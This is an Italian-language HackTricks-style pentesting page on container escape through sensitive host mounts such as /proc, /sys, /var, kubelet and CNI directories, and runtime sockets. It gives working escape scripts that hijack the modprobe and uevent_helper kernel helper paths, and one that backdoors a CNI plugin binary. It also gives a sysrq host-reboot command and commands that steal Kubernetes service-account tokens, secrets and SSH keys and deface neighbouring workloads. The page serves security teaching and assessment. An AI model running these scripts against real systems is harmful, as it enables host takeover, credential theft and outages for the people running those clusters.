# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

I host mounts sono una delle superfici pratiche più importanti per l'container-escape perché spesso riportano una vista di processo attentamente isolata a una visibilità diretta delle risorse host. I casi pericolosi non si limitano a `/`. I bind mounts di `/proc`, `/sys`, `/var`, runtime sockets, lo stato gestito da kubelet, o i path relativi ai device possono esporre controlli del kernel, credenziali, filesystem di container vicini e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle singole pagine di protezione perché il modello di abuso è trasversale. Un writable host mount è pericoloso in parte a causa dei mount namespaces, in parte a causa dei user namespaces, in parte della copertura AppArmor o SELinux, e in parte di quale esatto path host sia stato esposto. Trattarlo come un argomento a sé rende la superficie di attacco molto più facile da ragionare.

## `/proc` Exposure

procfs contiene sia normali informazioni di processo sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone entry proc scrivibili in modo inatteso può quindi portare a disclosure di informazioni, denial of service o esecuzione diretta di codice sull'host.

I path di alto valore di procfs includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Inizia controllando quali entry di alto valore di procfs sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi path sono interessanti per motivi diversi. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare host code-execution path quando sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di reconnaissance per kernel exploitation. `sched_debug` e `mountinfo` rivelano il contesto di process, cgroup e filesystem che può aiutare a ricostruire il layout dell'host dall'interno del container.

Il valore pratico di ciascun path è diverso, e trattarli tutti come se avessero lo stesso impatto rende più difficile il triage:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei path procfs a più alto impatto perché il kernel eseguirà un pipe handler dopo un crash. Un container che può puntare `core_pattern` a un payload memorizzato nel proprio overlay o in un host path montato può spesso ottenere host code execution. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo path controlla il helper in userspace usato dal kernel quando deve invocare la logica di caricamento dei module. Se è scrivibile dal container e interpretato nel contesto dell'host, può diventare un altro primitive di host code-execution. È particolarmente interessante quando viene combinato con un modo per triggerare il helper path.
- `/proc/sys/vm/panic_on_oom`
Di solito non è un primitive di escape pulito, ma può convertire la memory pressure in denial of service sull'intero host trasformando le condizioni di OOM in comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registration è scrivibile, l'attacker può registrare un handler per un valore magic scelto e ottenere execution nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
Utile per kernel exploit triage. Aiuta a determinare quali subsystem, mitigations e funzionalità opzionali del kernel sono abilitate senza dover usare i package metadata dell'host.
- `/proc/sysrq-trigger`
Principalmente un path di denial-of-service, ma molto serio. Può reboot, panic o in altro modo interrompere immediatamente l'host.
- `/proc/kmsg`
Rivela i messaggi del kernel ring buffer. Utile per host fingerprinting, crash analysis e, in alcuni ambienti, per leak di informazioni utili a kernel exploitation.
- `/proc/kallsyms`
Valioso quando è leggibile perché espone le informazioni sui kernel symbol esportati e può aiutare a superare le assunzioni di address randomization durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
Questa è un'interfaccia diretta alla memoria del process. Se il target process è raggiungibile con le necessarie condizioni in stile ptrace, può consentire di leggere o modificare la memoria di un altro process. L'impatto realistico dipende molto da credentials, `hidepid`, Yama e restrizioni ptrace, quindi è un path potente ma condizionale.
- `/proc/kcore`
Espone una vista in stile core-image della memoria di sistema. Il file è enorme e scomodo da usare, ma se è leggibile in modo significativo indica una superficie di memoria dell'host mal esposta.
- `/proc/kmem` e `/proc/mem`
Storicamente interfacce raw memory ad alto impatto. Su molti sistemi moderni sono disabilitate o fortemente limitate, ma se presenti e utilizzabili vanno trattate come finding critici.
- `/proc/sched_debug`
Perde informazioni di scheduling e task che possono esporre le identità dei process dell'host anche quando altre viste dei process sembrano più pulite del previsto.
- `/proc/[pid]/mountinfo`
Estremamente utile per ricostruire dove vive davvero il container sull'host, quali path sono supportati da overlay e se un mount scrivibile corrisponde a contenuto dell'host o solo al layer del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare il host path del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché numerosi trucchi di host-execution richiedono di trasformare un path all'interno del container nel path corrispondente dal punto di vista dell'host.

### Full Example: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il path dell'helper viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dal target e dal comportamento del kernel, ma il punto importante è che un percorso helper scrivibile può reindirizzare una futura invocazione del kernel helper verso contenuto host-path controllato dall'attaccante.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Se l'obiettivo è la valutazione dell'exploitability invece di una escape immediata:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a rispondere se sono visibili informazioni utili sui simboli, se i recenti messaggi del kernel rivelano uno stato interessante e quali funzionalità o mitigazioni del kernel sono compilate. L'impatto di solito non è un escape diretto, ma può ridurre drasticamente i tempi di triage delle vulnerabilità del kernel.

### Full Example: SysRq Host Reboot

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è un riavvio immediato dell'host. Questo non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave della semplice disclosure di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di stato del kernel e dei dispositivi. Alcuni percorsi sysfs sono utili soprattutto per il fingerprinting, mentre altri possono influenzare l'esecuzione di helper, il comportamento dei device, la configurazione dei security-module o lo stato del firmware.

I percorsi sysfs ad alto valore includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi contano per motivi diversi. `/sys/class/thermal` può influenzare il comportamento della gestione termica e quindi la stabilità dell'host in ambienti esposti in modo insicuro. `/sys/kernel/vmcoreinfo` può leak informazioni sul crash-dump e sul layout del kernel che aiutano nel fingerprinting di basso livello dell'host. `/sys/kernel/security` è l'interfaccia `securityfs` usata dai Linux Security Modules, quindi un accesso inatteso lì può esporre o alterare stato correlato a MAC. I percorsi delle variabili EFI possono influenzare le impostazioni di boot supportate dal firmware, rendendoli molto più gravi dei normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia orientata agli sviluppatori, con aspettative di sicurezza molto inferiori rispetto alle API del kernel rinforzate esposte in produzione.

I comandi utili per analizzare questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Cosa rende interessanti quei comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux, o un altro surface LSM è visibile in un modo che avrebbe dovuto restare solo host-side.
- `/sys/kernel/debug` è spesso il finding più allarmante in questo gruppo. Se `debugfs` è montato e leggibile o scrivibile, aspettati un ampio surface esposto al kernel il cui rischio esatto dipende dai debug node abilitati.
- L’esposizione delle variabili EFI è meno comune, ma se presente ha un impatto elevato perché coinvolge impostazioni supportate dal firmware invece di normali file runtime.
- `/sys/class/thermal` è principalmente rilevante per la stabilità dell’host e l’interazione con l’hardware, non per un elegante shell-style escape.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte per host fingerprinting e crash analysis, utile per capire lo stato low-level del kernel.

### Full Example: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può eseguire un helper controllato dall’attaccante quando viene triggerato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Il motivo per cui questo funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host invece che all'interno del container corrente.

## `/var` Exposure

Montare `/var` dell'host in un container è spesso sottovalutato perché non sembra così drammatico come montare `/`. In pratica può essere sufficiente per raggiungere runtime sockets, directory di snapshot dei container, volumi dei pod gestiti da kubelet, token di service-account proiettati e filesystem di applicazioni vicine. Sui nodi moderni, `/var` è spesso il punto in cui vive davvero lo stato dei container più interessante dal punto di vista operativo.

### Kubernetes Example

Un pod con `hostPath: /var` spesso può leggere i token proiettati di altri pod e il contenuto degli snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché rispondono alla domanda se il mount esponga solo dati applicativi poco interessanti oppure credenziali del cluster ad alto impatto. Un token di service-account leggibile può trasformare immediatamente l'esecuzione di codice locale in accesso alle Kubernetes API.

Se il token è presente, verifica cosa può raggiungere invece di fermarti alla scoperta del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto qui può essere molto più ampio del solo accesso al nodo locale. Un token con RBAC ampio può trasformare un `/var` montato in una compromissione dell'intero cluster.

### Esempio Docker And containerd

Sui host Docker i dati rilevanti si trovano spesso sotto `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi sotto `/var/lib/containerd` o in path specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il `/var` montato espone contenuti snapshot scrivibili di un altro workload, l’attaccante potrebbe essere in grado di alterare file dell’applicazione, inserire web content o modificare gli script di avvio senza toccare la configurazione del container corrente.

Idee concrete di abuso una volta trovato contenuto snapshot scrivibile:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto delle mount di `/var`: application tampering, recupero di secret e lateral movement verso workload adiacenti.

## Kubelet State, Plugins, And CNI Paths

Una mount di `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` è spesso esposta tramite privileged DaemonSets, CNI agents, CSI node plugins, GPU operators e storage helpers. Queste mount sono facili da liquidare come "node plumbing", ma si trovano direttamente nel percorso di esecuzione per nuovi pod e spesso contengono credenziali kubelet, secret proiettati, socket di registrazione e binary plugin eseguibili lato host.

I target ad alto valore includono:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

I comandi di review utili sono:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Perché questi path contano:

- `/var/lib/kubelet/pki` può esporre i certificati client di kubelet e altre credenziali locali del nodo che a volte possono essere riutilizzate contro l'API server o endpoint TLS esposti da kubelet, a seconda del design del cluster.
- `/var/lib/kubelet/pods` spesso contiene service-account token proiettati e Secrets montati per pod vicini sullo stesso nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` è soprattutto una superficie di reconnaissance, ma molto utile: rivela quali pod e container possiedono attualmente GPU, hugepages, dispositivi SR-IOV e altre risorse locali scarse del nodo.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` rivelano quali plugin CSI, DRA e device sono installati e a quali socket kubelet si aspetta di parlare. Se queste directory sono scrivibili invece che solo leggibili, il finding diventa molto più serio.
- `/opt/cni/bin` e `/etc/cni/net.d` si trovano direttamente sul percorso di configurazione della pod-network. L'accesso in scrittura lì è spesso un primitive di host-execution ritardata, non solo un'esposizione di configurazione.

### Full Example: Writable `/opt/cni/bin`

Se una directory binaria CNI dell'host è montata read-write, sostituire un plugin può bastare per ottenere esecuzione sull'host la volta successiva che kubelet crea un pod sandbox su quel nodo:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Questo non è immediato come un `docker.sock` montato, ma è spesso più realistico in pod di Kubernetes compromessi. Il punto importante è che il binary modificato viene eseguito in seguito dal flusso di configurazione della host network, non dal container corrente.


## Runtime Sockets

I mount sensibili dell'host spesso includono runtime sockets invece di directory complete. Sono così importanti che meritano una ripetizione esplicita qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi di exploit completi una volta che uno di questi socket è montato.

Come rapido pattern di prima interazione:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se uno di questi ha successo, il percorso da "mounted socket" a "start a more privileged sibling container" è di solito molto più breve di qualsiasi path di breakout del kernel.

## Mount-Related CVEs

Gli host mount interagiscono anche con le vulnerabilità del runtime. Esempi recenti importanti includono:

- `CVE-2024-21626` in `runc`, dove un leaked directory file descriptor poteva collocare la working directory sul filesystem dell'host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` in BuildKit, dove Dockerfile, frontend e flussi `RUN --mount` malevoli potevano reintrodurre accesso a file dell'host, deletion o privilegi elevati durante i build.
- `CVE-2024-1753` in Buildah e Podman build flows, dove bind mount costruiti ad arte durante il build potevano esporre `/` in read-write.
- `CVE-2025-47290` in `containerd` 2.1.0, dove un TOCTOU durante l'unpack dell'image poteva permettere a un image appositamente costruita di modificare il filesystem dell'host durante il pull.

Queste CVEs sono importanti qui perché mostrano che la gestione dei mount non riguarda solo la configurazione dell'operatore. Anche il runtime stesso può introdurre condizioni di escape guidate dai mount.

## Checks

Usa questi comandi per individuare rapidamente le mount exposures di maggior valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
What is interesting here:

- Host root, `/proc`, `/sys`, `/var`, e runtime sockets sono findings ad alta priorità.
- Le voci writable di proc/sys spesso significano che il mount sta esponendo controlli kernel globali dell'host invece di una vista sicura del container.
- I percorsi montati di `/var` meritano una revisione di credential e dei workload vicini, non solo una revisione del filesystem.
- Le directory di stato di Kubelet e i percorsi CNI/plugin meritano la stessa priorità dei runtime sockets perché spesso si trovano direttamente sul percorso di creazione dei pod e distribuzione delle credential del node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
